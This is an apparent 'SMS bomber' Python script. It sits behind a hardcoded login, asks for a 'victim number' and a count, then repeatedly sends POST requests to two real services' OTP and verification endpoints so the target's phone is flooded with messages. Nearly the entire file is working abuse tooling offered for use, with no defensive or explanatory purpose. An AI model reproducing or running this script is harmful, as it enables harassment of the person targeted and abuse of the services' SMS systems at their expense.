import os
import sys
os.system("clear")
#CLAVEU
on_green="\033[42m"       # Green
blue="\033[0;34m"         # Blue
r="\033[1;31m"
g="\033[1;32m"
y="\033[1;33m"
b="\033[1;34m"
p="\033[1;35m"
c="\033[1;36m"
os.system('figlet -f small X0N4Y3M | lolcat')
print(on_green+'\n\t[Aurthor]-SABBIR AHMED')
print(blue+'========================================================')
stc1=str(input(y+'\n\t USERNAME: '+g))
stc2=str(input(y+'\n\t PASSWORD: '+g))


if stc1=='AK47':
    os.system('')
else:
   print(r+'\n YOUR PASSWORD WAS WRONG..!!')
if stc2=='AK46':

    import os
    import requests
    from requests.structures import CaseInsensitiveDict
    os.system('clear')
    os.system('figlet -f small X0N4Y3M | lolcat')
    print(on_green+'\t [Aurthor]-SABBIR AHMED')
    print(blue+'========================================================')
    number=str(input(y+'\n ENTER VICTIM NUMBER : '+r+'+88'))
    amount=int(input(r+'\n THE AMOUNT  : '))
    url = "https://ss.binge.buzz/otp/send/login"

    headers = CaseInsensitiveDict()
    headers["Content-Type"] = "application/x-www-form-urlencoded"
    headers["Content-Length"] = "0"

    data = "phone="+number

    url4 = "https://xrides.shohoz.com/api/v2/user/send-mobile-verification-code"

    headers2 = CaseInsensitiveDict()
    headers2["Content-Type"] = "application/json"

    data2 = '{\"mobile\":\"'+number+'\"}'

    for j in range (amount):
     resp = requests.post(url, headers=headers,data=data)
     resp2 = requests.post(url4, headers=headers2,data=data2)
     print(str('')+g+'\n SMS REQUEST SENDING TO '+r+number)

